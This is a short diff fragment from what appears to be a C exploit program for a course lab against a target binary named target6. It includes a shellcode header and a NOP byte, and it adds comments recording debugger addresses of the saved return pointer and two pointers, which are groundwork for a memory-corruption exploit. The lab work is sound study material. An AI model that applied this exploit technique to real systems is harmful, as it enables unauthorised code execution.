@@ -4,6 +4,10 @@
 #include <unistd.h>
 #include "shellcode-64.h"
 
+// rip at 0x3021fea8
+// p &p : $1 = (char **) 0x3021fe98
+// p &q : $2 = (char **) 0x3021fe90
+
 #define TARGET "../targets/target6"
 #define NOP 0x90
 #define BUFFER_SIZE 200
